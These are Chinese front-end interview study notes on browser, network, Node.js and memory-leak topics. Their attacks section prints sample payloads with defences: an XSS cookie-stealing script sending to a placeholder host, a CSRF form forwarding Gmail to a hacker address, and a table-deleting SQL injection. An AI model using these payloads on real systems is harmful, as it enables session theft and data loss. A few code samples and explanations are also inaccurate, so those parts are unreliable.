移动端 click 300ms 延迟，如何解决

## 背景

智能手机开始流行的前期，浏览器可以点击缩放（double tap to zoom）网页。这样在手机上就可以浏览 PC 网页，很酷炫。

![](./img/nytimes.jpeg)

浏览器为了分辨 click 还是“点击缩放”，就强行把 click 时间延迟 300ms 触发。

## 初期解决方案

[FastClick](https://www.npmjs.com/package/fastclick) 专门用于解决这个问题。

```js
// FastClick 使用非常简单
window.addEventListener( "load", function() {
    FastClick.attach( document.body )
}, false )
```

它的内部原理是
- 监听 `touchend` 事件 （`touchstart` `touchend` 会先于 `click` 事件被触发）
- 通过 [DOM 自定义事件](https://developer.mozilla.org/zh-CN/docs/Web/API/CustomEvent) 模拟一个 click 事件
- 把 300ms 之后触发的 click 事件阻止掉

## 现代浏览器的改进

随着近几年移动端响应式的大力发展，移动端网页和 PC 网页有不同的设计，不用再缩放查看。<br>
这 300ms 的延迟就多余了，现代浏览器可以通过禁止缩放来取消这 300ms 的延迟。

- Chrome 32+ on Android
- iOS 9.3

```html
<meta name="viewport" content="width=device-width" />
```

## 答案

- 原因：点击缩放（double tap to zoom）网页
- 可使用 FastClick 解决
- 现代浏览器可使用 `width=device-width` 规避


# 知识广度\02-文本小节-Retina屏幕1px宽度.md
# 1px 宽度

注：文本小节

## 题目

Retina 屏 1px 像素问题，如何实现

## 介绍

该问题通常用于考察你是否做过移动端 h5 项目。<br>
如果你能知道这个问题，并且答出来，知道前因后果，证明你有过 h5 开发经验。<br>
否则就说明你没有 h5 的任何开发经验，尤其是你如果都不知道这个事情，那就更加说明这一点。

## 普通的 `1px`

如果仅仅使用 css 的 `1px` 来设置 border ，那可能会出现比较粗的情况。<br>
因为，有些手机屏幕的 DPR = 2 ，即 `1px` 它会用两个物理像素来显示，就粗了。

```css
#box {
    padding: 10px 0;
    border-bottom: 1px solid #eee;
}
```

如下图，上面是微信 app 的 border ，下面是 `1px` 的 border ，有明显的区别。显得很粗糙，很不精致，设计师不会允许这样的页面发布上线的。

![](./img/border-1.png)

PS：你不能直接写 `0.5px` ，浏览器兼容性不好，渲染出来可能还是 `1px` 的效果。

## 使用 `transform` 缩小

我们可以使用 css 伪类 + `transform` 来优化这一问题。即把默认的 `1px` 宽度给压缩 0.5 倍。

```css
#box {
    padding: 10px 0;
    position: relative;
}
#box::before {
    content: '';
    position: absolute;
    left: 0;
    bottom: 0;
    width: 100%;
    height: 1px;
    background: #d9d9d9;
    transform: scaleY(0.5);
    transform-origin: 0 0;
}
```

如下图，上面是微信 app 的 border ，下面是优化之后的 border ，两者粗细就一致了。

![](./img/border-2.png)

## 连环问：如果有 `border-radius` 怎么办

可以使用 `box-shadow` 设置
- X 偏移量 `0`
- Y 偏移量 `0`
- 阴影模糊半径 `0`
- 阴影扩散半径 `0.5px`
- 阴影颜色

```css
#box2 {
    margin-top: 20px;
    padding: 10px;
    border-radius: 5px;
    /* border: 1px solid #d9d9d9; */
    box-shadow: 0 0 0 0.5px #d9d9d9;
}
```


# 知识广度\03-token和cookie区别.md
# cookie 和 token 区别

## 题目

cookie 和 token 有何区别

## cookie

http 请求是无状态的，即每次请求之后都会断开链接。<br>
所以，每次请求时，都可以携带一段信息发送到服务端，以表明客户端的用户身份。服务端也也可以通过 `set-cookie` 向客户端设置 cookie 内容。<br>
由于每次请求都携带 cookie ，所以 cookie 大小限制 4kb 以内。

![](./img/cookie.png)

## cookie 作为本地存储

前些年大家还常用 cookie 作为本地存储，这并不完全合适。<br>
所以后来 html5 增加了 `localStorage` 和 `sessionStorage` 作为本地存储。

## cookie 跨域限制

浏览器存储 cookie 是按照域名区分的，在浏览器无法通过 JS `document.cookie` 获取到其他域名的 cookie 。

http 请求传递 cookie 默认有跨域限制。如果想要开启，需要客户端和服务器同时设置允许
- 客户端：使用 fetch 和 XMLHttpRequest 或者 axios 需要配置 `withCredentials`
- 服务端：需要配置 header `Access-Control-Allow-Credentials`

## 浏览器禁用第三发 cookie

现代浏览器都开始禁用第三方 cookie （第三方 js 设置 cookie），打击第三方广告，保护用户个人隐私。

例如一个电商网站 A 引用了淘宝广告的 js
- 你访问 A 时，淘宝 js 设置 cookie ，记录下商品信息
- 你再次访问淘宝时，淘宝即可获取这个 cookie 内容
- 再和你的个人信息（也在 cookie 里）一起发送到服务端，这样就知道了你看了哪个商品

## cookie 和 session

cookie 用途非常广泛，最常见的就是登录。

使用 cookie 做登录校验
- 前端输入用户名密码，传给后端
- 后端验证成功，返回信息时 set-cookie
- 接下来所有接口访问，都自动带上 cookie （浏览器的默认行为， http 协议的规定）

什么是 session ？
- cookie 只存储 userId ，不去暴露用户信息
- 用户信息存储在 session 中 —— session 就是服务端的一个 hash 表

## token

token 和 cookie 一样，也是一段用于客户端身份验证的字符串，随着 http 请求发送
- cookie 是 http 协议规范的，而 token 是自定义的，可以用任何方式传输（如 header body query-string 等）
- token 默认不会在浏览器存储
- token 没有跨域限制

所以，token 很适合做跨域或者第三方的身份验证。

## token 和 JWT

JWT === JSON Web Token

JWT 的过程
- 前端输入用户名密码，传给后端
- 后端验证成功，返回一段 token 字符串 - 将用户信息加密之后得到的
- 前端获取 token 之后，存储下来
- 以后访问接口，都在 header 中带上这段 token

![](./img/token.png)

## 答案

- cookie：http 规范；有跨域限制；可存储在本地；可配合 session 实现登录
- token：自定义标准；不在本地存储；无跨域限制；可用于 JWT 登录

## 连环问：session 和 JWT 比较，你更推荐哪个？

Session 优点
- 原理简单，易于学习
- 用户信息存储在服务端，可以快速封禁某个登录的用户 —— 有这方强需求的人，一定选择 Session

Session 的缺点
- 占用服务端内存，有硬件成本
- 多进程、多服务器时，不好同步 —— 一般使用第三方 redis 存储 ，成本高
- 跨域传递 cookie ，需要特殊配置

JWT 的优点
- 不占用服务器内存
- 多进程、多服务器，不受影响
- 不受跨域限制

JWT 的缺点
- 无法快速封禁登录的用户

总结：如果没有“快速封禁登录用户”的需求，建议使用 JWT 方式。

## 连环问：单点登录

### 基于 cookie

简单的，如果业务系统都在同一主域名下，比如 `wenku.baidu.com` `tieba.baidu.com` ，就好办了。
可以直接把 cookie domain 设置为主域名 `baidu.com` ，百度也就是这么干的。

### SSO

复杂一点的，滴滴这么潮的公司，同时拥有 `didichuxing.com` `xiaojukeji.com` `didiglobal.com` 等域名，种 cookie 是完全绕不开的。需要使用 SSO 技术方案

![](./img/sso.png)

### OAuth2

上述 SSO 是 oauth 的实际案例，其他常见的还有微信登录、github 登录等。即，当设计到第三方用户登录校验时，都会使用 OAuth2.0 标准。
流程参考 [RFC 6749](https://tools.ietf.org/html/rfc6749)


# 知识广度\04-http-udp区别.md
# HTTP 和 UDP

## 题目

HTTP 和 UDP 有何区别

## 网络协议

![](./img/网络协议.png)

- HTTP 在应用层，直接被程序使用
- TCP 和 UDP 在传输层，底层

## UDP 的特点

UDP 是一种无连接的、不可靠的传输层协议。而 TCP 需要连接、断开连接，参考“三次握手、四次挥手”。

不需要连接，所以 UDP 的效率比 TCP 高。

虽然 UDP 从协议层是不稳定的，但随着现代网络硬件环境的提升，也能保证绝大部分情况下的稳定性。所以，UDP 一直处于被发展的趋势。

例如视频会议、语音通话这些允许中段、不完全保证持续连接的场景，又需要较高的传输效率，就很适合 UDP 协议。

## 答案

- HTTP 在应用层，而 UDP 和 TCP 在传输层
- HTTP 是有连接的、可靠的，UDP 是无连接的、不可靠的

## 连环问：http 1.0 1.1 2.0 区别

http 1.0 最基础的 http 协议

http 1.1
- 引入更多的缓存策略，如 `cache-control` `E-tag`
- 长链接，默认开启 `Connection: keep-alive` ，多次 http 请求减少了 TCP 连接次数
- 断点续传，状态吗 `206`
- 增加新的 method `PUT` `DELETE` 等，可以设计 Restful API

http2.0
- header 压缩，以减少体积
- 多路复用，一个 TCP 连接中可以多个 http 并行请求。拼接资源（如雪碧图、多 js 拼接一个）将变的多余
- 服务器端推送


# 知识广度\05-https中间人攻击.md
# https 中间人攻击

## 题目

什么是 https 中间人攻击，如何预防？

## 复习：https 加密原理

http 是明文传输，传输的所有内容（如登录的用户名和密码），都会被中间的代理商（无论合法还是非法）获取到。

http + TLS/SSL = https ，即加密传输信息。只有客户端和服务端可以解密为明文，中间的过程无法解密。

![](./img/https.png)

## 中间人攻击

中间人攻击，就是黑客劫持网络请求，伪造 CA 证书。

![](./img/中间人攻击.jpeg)

解决方案：使用浏览器可识别的，正规厂商的证书（如阿里云），慎用免费证书。

![](./img/https-错误.png)


# 知识广度\05-忽略.md
忽略本节


# 知识广度\06-defer和async.md
#  defer 和 async

## 题目

`<script>` 的 defer 和 async 属性有何区别

## 答案

- `<script src="xxx.js">` 当解析到该标签时，会暂停 html 解析，并触发 js 下载、执行。然后再继续 html 解析。
- `<script async src="xxx.js">` js 下载和 html 解析可并行，下载完之后暂停 html 解析，执行 js 。然后再继续 html 解析。
- `<script defer src="xxx.js">` js 下载和 html 解析可并行。等待 html 解析完之后再执行 js 。

![](./img/async-defer.png)

## 连环问：preload prefetch dns-prefetch 的区别

- preload 表示资源在当前页面使用，浏览器会**优先**加载
- prefetch 表示资源可能在**未来的页面**（如通过链接打开下一个页面）使用，浏览器将在**空闲时**加载

```html
<head>
  <meta charset="utf-8">
  <title>JS and CSS preload</title>

  <!-- preload -->
  <link rel="preload" href="style.css" as="style">
  <link rel="preload" href="main.js" as="script">

  <!-- prefetch -->
  <link rel="prefetch" href="other.js" as="script">

  <!-- 引用 css -->
  <link rel="stylesheet" href="style.css">
</head>

<body>
  <h1>hello</h1>

  <!-- 引用 js -->
  <script src="main.js" defer></script>
</body>
```

## 连环问：dns-prefetch 和 preconnect 有什么作用？

一个 http 请求，第一步就是 DNS 解析得到 IP ，然后进行 TCP 连接。连接成功后再发送请求。

dns-prefetch 即 DNS 预获取，preconnect 即预连接。<br>
当网页请求**第三方**资源时，可以提前进行 DNS 查询、TCP 连接，以减少请求时的时间。

```html
<html>
  <head>
    <link rel="dns-prefetch" href="https://fonts.gstatic.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>

  </head>
  <body>
      <p>hello</p>
  </body>
</html>
```


# 知识广度\07-前端攻击.md
# 前端攻击

## 题目

你所了解的前端攻击手段有哪些，该如何预防？

## XSS

Cross Site Scripting 跨站脚本攻击

用户通过某种方式（如输入框、文本编辑器）输入一些内容，其中带有攻击代码（JS 代码）。<br>
该内容再显示时，这些代码也将会被执行，形成了攻击效果。

```html
<!-- 例如用户提交的内容中有： -->
<script>
    var img = document.createElement('img')
    img.src = 'http://xxx.com/api/xxx?userInfo=' + document.cookie // 将 cookie 提交到自己的服务器
</script>
```

最简单的解决方式：替换特殊字符

```js
const newStr = str.replaceAll('<', '&lt;').replaceAll('>', '&gt;')
```

也可以使用第三方工具，例如
- https://www.npmjs.com/package/xss
- https://www.npmjs.com/package/escape-html

现代框架默认会屏蔽 XSS 攻击，除非自己手动开启
- Vue `v-html`
- React `dangerouslySetInnerHTML`

## CSRF

Cross-site request forgery 跨站请求伪造

请看下面的故事
- 小明登录了 Gmail 邮箱，收到一封广告邮件 “转让比特币，只要 998”
- 小明抱着好奇的心态点开看了看，发现是个空白页面，就关闭了

但此时，攻击已经完成了。黑客在这个空白页面设置了 js 代码，会让小明的邮件都转发到 `hacker@hackermail.com` 。<br>
因为小明已经登录了 Gmail ，有了 Gmail 的 cookie 。所以再去请求 Gmail API 就会带着 cookie ，就有可能成功。

```html
<form method="POST" action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf" enctype="multipart/form-data"> 
    <input type="hidden" name="cf2_emc" value="true"/> 
    <input type="hidden" name="cf2_email" value="hacker@hakermail.com"/> 
    .....
    <input type="hidden" name="irf" value="on"/> 
    <input type="hidden" name="nvp_bu_cftb" value="Create Filter"/> 
</form> 
<script> 
    document.forms[0].submit();

    // PS：有些是 post 请求，有些是 get 请求
    //     get 请求如果用 img.src 还可以规避跨域，更加危险
</script>
```

邮件经常用来接收验证码，这是很危险的事情。<br>
当然了，后来 Gmail 修复了这个漏洞。但新的故事仍在不断发生中。

CSRF 的过程
- 用户登录了 `a.com` ，有了 cookie
- 黑客引诱用户访问 `b.com` 网页，并在其中发起一个跨站请求 `a.com/api/xxx`
- `a.com` API 收到 cookie ，误以为是真实用户的请求，就受理了

CSRF 的预防
- 严格的跨域请求限制
- 为 cookie 设置 `SameSite` 不随跨域请求被发送 `Set-Cookie: key1=val1; key2=val2; SameSite=Strict;`
- 关键接口使用短信验证码等双重验证

## 点击劫持 Clickjacking

小明被诱导到一个钓鱼网站，点击了一个按钮，其实已经关注了慕课网双越老师。因为他可能已经登录了慕课网。<br>
这可以是关注，也可以是付款转账等其他危险操作。

![](./img/点击劫持.png)

点击劫持的原理：黑客在自己的网站，使用隐藏的 `<iframe>` 嵌入其他网页，诱导用户按顺序点击。

使用 JS 预防

```js
if (top.location.hostname !== self.location.hostname) {
    alert("您正在访问不安全的页面，即将跳转到安全页面！")
    top.location.href = self.location.href
}
```

增加 http header `X-Frame-Options:SAMEORIGIN` ，让 `<iframe>` 只能加载同域名的网页。

PS：点击劫持，攻击那些需要用户点击操作的行为。CSRF 不需要用户知道，偷偷完成。

## DDoS

Distributed denial-of-service 分布式拒绝服务

通过大规模的网络流量淹没目标服务器或其周边基础设施，以破坏目标服务器、服务或网络正常流量的恶意行为。<br>
类似于恶意堵车，妨碍正常车辆通行。

网络上的设备感染了恶意软件，被黑客操控，同时向一个域名或者 IP 发送网络请求。因此形成了洪水一样的攻击效果。<br>
由于这些请求都来自分布在网络上的各个设备，所以不太容易分辨合法性。

DDoS 的预防：软件层面不好做，可以选择商用的防火墙，如[阿里云 WAF](https://www.aliyun.com/product/waf?spm=5176.7967425.J_8058803260.34.3d017748VkTlhL)。

PS：阮一峰的网站就曾遭遇过 DDoS 攻击 https://www.ruanyifeng.com/blog/2018/06/ddos.html

## SQL 注入

普通的登录方式，输入用户名 `zhangsan` 、密码 `123` ，然后服务端去数据库查询。<br>
会执行一个 sql 语句 `select * from users where username='zhangsan' and password='123'` ，然后判断是否找到该用户。

如果用户输入的是用户名 `' delete from users where 1=1; --` ，密码 `'123'`<br>
那生成的 sql 语句就是 `select * from users where username='' delete from users where 1=1; --' and password='123'`<br>
这样就会把 `users` 数据表全部删除。

防止 SQL 注入：服务端进行特殊字符转换，如把 `'` 转换为 `\'`

## 答案

- XSS
- CSRF
- 点击劫持
- DDoS
- SQL 注入


# 知识广度\08-websocket.md
# webSocket

## 题目

webSocket 和 http 协议有何区别？有和应用场景？

## webSocket 简介

webSocket 和 http 都是应用层，支持端对端的通讯。可以由服务端发起，也可以由客户端发起。<br>
代码参考 ws-server 中 webSocket1.html webSocket2.html

场景：消息通知，直播讨论区，聊天室，协同编辑

## webSocket 建立连接

会先发起一个 http 请求，根服务端建立连接。连接成功之后再升级为 webSocket 协议，然后再通讯。

![](./img/ws连接.png)

## webSocket 和 http 区别

- 协议名称不同 `ws` 和 `http`
- http 一般只能浏览器发起请求，webSocket 可以双端发起请求
- webSocket 无跨域限制
- webSocket 通过 `send` 和 `onmessage` 进行通讯，http 通过 `req` 和 `res` 通讯

PS：`ws` 可以升级为 `wss` 协议，像 `http` 升级到 `https` 一样，增加 `SSL` 安全协议。

```js
import { createServer } from 'https'
import { readFileSync } from 'fs'
import { WebSocketServer } from 'ws'

const server = createServer({
  cert: readFileSync('/path/to/cert.pem'),
  key: readFileSync('/path/to/key.pem')
})
const wss = new WebSocketServer({ server })
```

## 扩展

PS：如果做项目开发，推荐使用 [socket.io](https://www.npmjs.com/package/socket.io)，API 更方便。

```js
io.on('connection', socket => {
  // emit an event to the socket
  socket.emit('request', /* … */)
  // emit an event to all connected sockets
  io.emit('broadcast', /* … */)
  // listen to the event
  socket.on('reply', () => { /* … */ })
})
```

## 连环问：webSocket 和长轮询（长连接）的区别

- http 长轮询 - 客户端发起 http 请求，server 不立即返回，等待有结果再返回。这期间 TCP 连接不会关闭，阻塞式。（需要处理 timeout 的情况）
- webSocket - 客户端发起请求，服务端接收，连接关闭。服务端发起请求，客户端接收，连接关闭。非阻塞。

![](./img/长轮询.jpeg)


# 知识广度\09-输入url到页面展示.md
# 输入 url 到页面展示

## 题目

从输入 url 到显示页面的完整过程

## 特别注意

现在浏览器经过多年发展和优化，加载和渲染机制已经非常复杂，我们只能讲解基本的流程。不可较真细节。

## 步骤

- 网络请求
- 解析
- 渲染页面

## 网络请求

- DNS 解析，根据域名获得 IP 地址
- 建立 TCP 连接 “三次握手”
- 发送 http 请求
- 接收请求响应，获得网页 html 代码

获取了 html 之后，解析过程中还可能会继续加载其他资源：js css 图片等。<br>
静态资源可能会有强缓存，加载时要判断。

![](./img/cache-control.png)

## 解析

> html css 等源代码是字符串形式，需要解析为特定的数据结构，才能被后续使用。

过程
- html 构建 DOM 树
- css 构建 CSSOM（即 style tree）
- 两者结合形成 Render tree （包括尺寸、定位等）

![](./img/render.png)

css 包括：
- 内嵌 css `<style>`
- 外链 css `<link>`

解析到 `<script>` 加载，并有可能修改 DOM 树和 render tree 。
- 内嵌 js
- 外链 js

PS：加载和执行 `<script>` 的情况比较多，如有 `defer` `async` 属性，就不一样。

解析到 `<img>` 等媒体文件，也要并行加载。加载完成后再渲染页面。

综上，为了避免不必要的情况，要遵守以下规则
- css 尽量放在 `<head>` 中，不要异步加载 css
- js 尽量放在 `<body>` 最后，不要中途加载、执行 js
- `<img>` 等媒体文件尽量限制尺寸，防止渲染时重绘页面

## 渲染页面

通过 render tree 绘制页面。

绘制完成之后，还要继续执行异步加载的资源
- 异步的 css ，重新渲染页面
- 异步的 js ，执行（可能重新渲染页面）
- 异步加载的图片等，可能重新渲染页面（根据图片尺寸）

最后页面渲染完成。

## 答案

- 网络请求
    - DNS 解析
    - TCP 连接
    - HTTP 请求和响应
- 解析
    - DOM 树
    - render tree
- 渲染页面
    - 可能重绘页面

## 连环问：什么是重绘 repaint 和重排 reflow ，有何区别

页面渲染完成之后，随着异步加载和用户的操作，会随时发生 repaint 或者 reflow 。例如
- 各种网页动画
- modal dialog 弹框
- 页面元素的新增、删除和隐藏

结论：重排的影响更大
- 重绘 repaint ：某些元素的外观被改变，但尺寸和定位不变，例如：元素的背景色改变。
- 重排 reflow ：重新生成布局，重新排列元素。如一个元素高度变化，导致所有元素都下移。

重绘不一定重排，但重排一定会导致重绘。<br>
所以，要尽量避免重排。

- 集中修改样式，或直接使用 `class`
- DOM 操作前先使用 `display: none` 脱离文档流
- 使用 BFC ，不影响外部的元素
- 对于频繁触发的操作（`resize` `scroll` 等）使用节流和防抖
- 使用 `createDocumentFragment` 进行批量 DOM 操作
- 优化动画，如使用 `requestAnimationFrame` 或者 CSS3（可启用 GPU 加速）

## 连环问：触发 css BFC 的条件

BFC - Block Formatting Context 块格式化上下文
- 根节点 html
- 设置 float `left` `right`
- 设置 overflow `auto` `scroll` `hidden`
- 设置 display `inline-block` `table` `table-cell` `flex` `grid`
- 设置 position `absolute` `fixed`


# 知识广度\10-网页多标签通讯.md
# 网页多标签页之间的通讯

## 题目

网络多标签之间如何通讯？<br>
例如打开两个 chrome 标签，一个访问列表页，一个访问详情页。在详情页修改了标题，列表页也要同步过来。

## webSocket

通过 webSocket 多页面通讯，无跨域限制。

## localStorage

同域的两个页面，可以通过 localStorage 通讯。A 页面可以监听到 B 页面的数据变化。

```js
// list 页面
window.addEventListener('storage', event => {
    console.log('key', event.key)
    console.log('newValue', event.newValue)
})

// detail 页面
localStorage.setItem('changeInfo', 'xxx')
```

## SharedWorker

Javascript 是单线程的，而且和页面渲染线程互斥。所以，一些计算量大的操作会影响页面渲染。<br>

[WebWorker](https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Workers_API/Using_web_workers) 可以 `new Worker('xxx.js')` 用来进行 JS 计算，并通过 `postMessage` 和 `onmessage` 和网页通讯。<br>
但这个 worker 是当前页面专有的，不得多个页面、iframe 共享。

PS：WebWorker 专用于 JS 计算，不支持 DOM 操作。

[SharedWorker](https://developer.mozilla.org/zh-CN/docs/Web/API/SharedWorker) 可以被同域的多个页面共享使用，也可以用于通讯。<br>
源码参考 msg-sharedWork-list.html 和 msg-sharedWork-detail.html 。注意，worker 中的日志需要 `chrome://inspect` 中打开控制台查看。

PS：注意浏览器兼容性，不支持 IE11

## 答案

- webSocket 需要服务端参与，但不限制跨域
- localStorage 简单易用
- SharedWorker 本地调试不太方便，考虑浏览器兼容性

## 连环问：iframe 通讯

除了上述几个方法，iframe 通讯最常用 [window.postMessage](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage) ，支持跨域。

通过 `window.postMessage` 发送消息。注意第二个参数，可以限制域名，如发送敏感信息，要限制域名。

```js
// 父页面向 iframe 发送消息
window.iframe1.contentWindow.postMessage('hello', '*')

// iframe 向父页面发送消息
window.parent.postMessage('world', '*')
```

可监听 `message` 来接收消息。可使用 `event.origin` 来判断信息来源是否合法，可选择不接受。

```js
window.addEventListener('message', event => {
    console.log('origin', event.origin) // 通过 origin 判断是否来源合法
    console.log('child received', event.data)
})
```


# 知识广度\11-koa2洋葱圈模型.md
# koa2 洋葱圈模型

## 题目

请描述 Koa2 的洋葱圈模型

## 解释

代码参考 Koa2 官网

```js
const Koa = require('koa');
const app = new Koa();

// logger
app.use(async (ctx, next) => {
  await next();
  const rt = ctx.response.get('X-Response-Time');
  console.log(`${ctx.method} ${ctx.url} - ${rt}`);
});

// x-response-time
app.use(async (ctx, next) => {
  const start = Date.now();
  await next();
  const ms = Date.now() - start;
  ctx.set('X-Response-Time', `${ms}ms`);
});

// response
app.use(async ctx => {
  ctx.body = 'Hello World';
});

app.listen(3000);
```

## 图示

![](./img/koa2.png)

![](./img/koa2洋葱圈.png)


# 知识广度\12-文本小节-为何需要nodejs.md
# 为何需要 nodejs

注：文本小节

## 题目

当 Java PHP Python 等服务端语言和技术都完备的情况下，为何还需要 nodejs 做服务端呢？

## 对比其他语言

当年 Java 被发明使用时， C C++ 也发展了几十年了，为何 Java 还照样发展壮大起来呢？

以及近几年、现在，仍有多种新的语言被发明和使用，例如 swift golang Dart 等。

所以，nodejs 被使用不是个例，而是历史、现在、未来都发生的事情，它仅仅是其中的一件。

## 技术的核心价值 —— 提升效率

如果你去做一个年终总结或者晋升述职，你对你的领导说：<br>
“我今年用了一个 xx 技术，非常厉害。最先进的技术，github stars 多少多少，国内外个大公司都在用，基于它来开发非常爽...”

说完，你的领导心里会有一个大大的问号：然后呢？这个技术给我降低了多少成本？带来了多少收益？—— 技术是生产力，技术的厉害最终都会体现到生产效率。<br>
让领导带着这个疑问，那你的年终奖或者晋升估计悬了。

现在你换一种说法：<br>
“我今年用了一个 xx 技术，非常厉害。这一年我们的项目工期降低了 xx ，项目 bug 率降低了 xx ，核算项目成本降低了 xx ，效率增加了 xx ...”<br>
然后把这个技术的优势展示一下，再展示一些统计数据。

说完，领导一看就觉得心里踏实了。

PS：不仅仅是软件技术，这个世界上任何技术、产品、制度流程、组织关系的存在，都是在优化效率。乃至全社会的经济发展，说白了就是生产效率。

## nodejs 如何提升效率

网上说的 nodejs 的好处，大概都是：单线程，基于事件驱动，非阻塞，适合高并发服务。<br>
这些都是技术优势，就跟上文的第一个述职一样，没有体现任何生产效率的价值。

有同学可能会问：“适合高并发服务” 这不就是生产效率吗？—— 这是一个好问题<br>
但是，我们看问题得综合起来看。例如，你告诉 Java 工程师 nodejs 的好处，他们会用吗？—— 不会的，因为学习和切换技术栈需要大量的成本。

所以，nodejs 的关键在于它用了 JS 语法，而社会上有大量的熟悉 JS 的前端工程师。
- JS 语言不用学习，只需要了解 nodejs API 即可
- 前端工程师不做服务端，没有切换技术栈的历史包袱

而前端工程师如果想要做服务端、做 webpack 等工具，nodejs 显然是他们最适合的技术方案，效率最高的方案。<br>
如果让他们再去学习 Java 等其他语言，这又是一大成本。

## 前端工程师需要自己做服务端吗？

如果是一个公司级别的系统，庞大的项目，前端、客户端、服务端指责划分明确，只不需要前端工程师来开发服务端的。

但有些职能部门，需要开发一些企业内部的管理工具，或者一些小型的系统。此时再去找服务端的人，会遇到很多沟通障碍，特别是某些大公司，还有很多其他非技术的因素阻碍沟通。所以，预期困难的沟通还不如自己搞一个，反正也不会很复杂（相对于企业级的大系统后端来说）。

而且，自己开发了服务端，就可以争取到更多的资源和工作机会。领导很希望这样，因为这样可以扩大自己的退伍，有利于领导未来的晋升。

综合来看，在这些情况下，前端人员用 nodejs 自研服务端，是不是效率最高的方式呢？—— 答案很明显。

## 总结

nodejs 有一定的技术优势，但它真正的优势在于使用 JS 语法，前端工程师学习成本低，能提高研发效率。


# 知识广度\13-总结.md
# 总结

## 内容总结

本章讲解前端知识广度的面试题，从前端到全栈。
包括移动端、nodejs 服务端、网络，这些都是和前端相关的技术领域。
高级工程师都有一定的技术广度，这样才能全面分析、保证排查问题。

## 划重点

- 移动端相关支持
- HTTP 网路相关支持
- nodejs 相关支持

## 注意事项

- 广了就不可能深
- 不会从 0 基础讲起，基础不熟悉的可以给我提问


# 知识深度\00-开始.md
# 开始

大厂面试会通过各种难题来试探你的技术深度，评估你的技术发展潜力，这是入职后确定级别、薪资的重要参考。所以，技术深度将决定你的“钱途”。本章将通过多个面试题，讲解前端面试常考的底层原理问题，涉及 JS Vue React Nodejs 等。

## 为何要考察

深挖你的技术“天花板”，看未来潜力和可培养性 —— 特别是对于刚毕业不就的新人。

如果面试通过了，大公司要定级（P6 还是 P7），其中技术深度就是很重要的参考标准。一个没有技术深度的人，不可能给高级别职称。

而且，那么多候选人，择优录取，肯定希望能招募到技术深度好的工程师。

## 考察重点

其实就是我们日常使用的技术，的一些深入。没有什么特别出格的。

- JS 相关原理
- Vue React 相关原理

## 注意事项

- 技术深度，就有那么 1-2 个方面即可。深了，就不可能全面
- 技术深度的题目不过关，也不一定就面试不通过

## 看几个面试题

列举几个代表性的题目，参考视频课程


# 知识深度\01-JS内存泄漏.md
# JS 内存泄漏

## 题目

如何检测 JS 内存泄漏？内存泄漏的场景有哪些？

## 垃圾回收

正常情况下，一个函数执行完，其中的变量都会是会 JS 垃圾回收。

```js
function fn() {
    const a = 'aaa'
    console.log(a)

    const obj = {
        x: 100
    }
    console.log(obj)
}
fn()
```

但某些情况下，变量是销毁不了的，因为可能会被再次使用。

```js
function fn() {
    const obj = {
        x: 100
    }
    window.obj = obj // 引用到了全局变量，obj 销毁不了
}
fn()
```

```js
function genDataFns() {
    const data = {} // 闭包，data 销毁不了
    return {
        get(key) {
            return data[key]
        },
        set(key, val) {
            data[key] = val
        }
    }
}
const { get, set } = genDataFns()
```

变量销毁不了，一定就是内存泄漏吗？—— 不一定

## 垃圾回收算法 - 引用计数

早起的垃圾回收算法，以“数据是否被引用”来判断要不要回收。

```js
// 对象被 a 引用
let a = {
    b: {
        x: 10
    }
}

let a1 = a // 又被 a1 引用
let a = 0 // 不再被 a 引用，但仍然被 a1 引用
let a1 = null // 不再被 a1 引用

// 对象最终没有任何引用，会被回收
```

但这个算法有一个缺陷 —— 循环引用。例如

```js
function fn() {
    const obj1 = {}
    const obj2 = {}
    obj1.a = obj2
    obj2.a = obj1 // 循环引用，无法回收 obj1 和 obj2
}
fn()
```

此前有一个很著名的例子。IE6、7 使用引用计数算法进行垃圾回收，常常因为循环引用导致 DOM 对象无法进行垃圾回收。<br>
下面的例子，即便界面上删除了 div1 ，但在 JS 内存中它仍然存在，包括它的所有属性。但现代浏览器已经解决了这个问题。

```js
var div1
window.onload = function () {
    div1 = document.getElementById('div1')
    div1.aaa = div1
    div1.someBigData = { ... } // 一个体积很大的数据。
}
```

以上这个例子就是内存泄漏。即，**不希望它存在的，它却仍然存在**，这是不符合预期的。关键在于“泄漏”。

## 垃圾回收算法 - 标记清除

基于上面的问题，现代浏览器使用“标记-清除”算法。根据“是否是否可获得”来判断是否回收。

定期从根（即全局变量）开始向下查找，能找到的即保留，找不到的即回收。循环引用不再是问题。

## 检测内存变化

可使用 Chrome devTools Performance 来检测内存变化
- 刷新页面，点击“GC”按钮
- 点击“Record”按钮开始记录，然后操作页面
- 操作结束，点击“GC”按钮，点击“结束”按钮，看分析结果

代码参考 `memory-change.html`

## 内存泄漏的场景

拿 Vue 来举例说明。

组件中有全局变量、函数的引用。组件销毁时要记得清空。

```js
export default {
    data() {
        return {
            nums: [10, 20, 30]
        }
    },
    mounted() {
        window.printNums = () => {
            console.log(this.nums)
        }
    },
    // beforeUnmount() {
    //     window.printNums = null
    // },
}
```

组件有全局定时器。组件销毁时要记得清除。

```js
export default {
    data() {
        return {
            // intervalId: 0,
            nums: [10, 20, 30]
        }
    },
    // methods: {
    //     printNums() {
    //         console.log(this.nums)
    //     }
    // },
    mounted() {
        setInterval(() => {
            console.log(this.nums)
        }, 200)
        
        // this.intervalId = setInterval(this.printNums, 200)
    },
    beforeUnmount() {
        // clearInterval(this.intervalId)
    },
}
```

组件中有全局事件的引用。组件销毁时记得解绑。

```js
export default {
    data() {
        return {
            nums: [10, 20, 30]
        }
    },
    // methods: {
    //     printNums() {
    //         console.log(this.nums)
    //     }
    // },
    mounted() {
        window.addEventListener('resize', () => {
            console.log(this.nums)
        })
        // window.addEventListener('reisze', this.printNums)
    },
    beforeUnmount() {
        // window.removeEventListener('reisze', this.printNums)
    },
}
```

组件中使用了自定义事件，销毁时要记得解绑。

```js
export default {
    data() {
        return {
            nums: [10, 20, 30]
        }
    },
    // methods: {
    //     printNums() {
    //         console.log(this.nums)
    //     }
    // },
    mounted() {
        event.on('event-key', () => {
            console.log(this.nums)
        })

        // event.on('event-key', this.printNums)
    },
    beforeUnmount() {
        // event.off('event-key', this.printNums)
    },
}
```

## 闭包是内存泄漏吗

上述代码 `genDataFns()` 就是一个很典型的闭包，闭包的变量是无法被垃圾回收的。

但闭包不是内存泄漏，因为它是符合开发者预期的，即本身就这么设计的。而内存泄漏是非预期的。

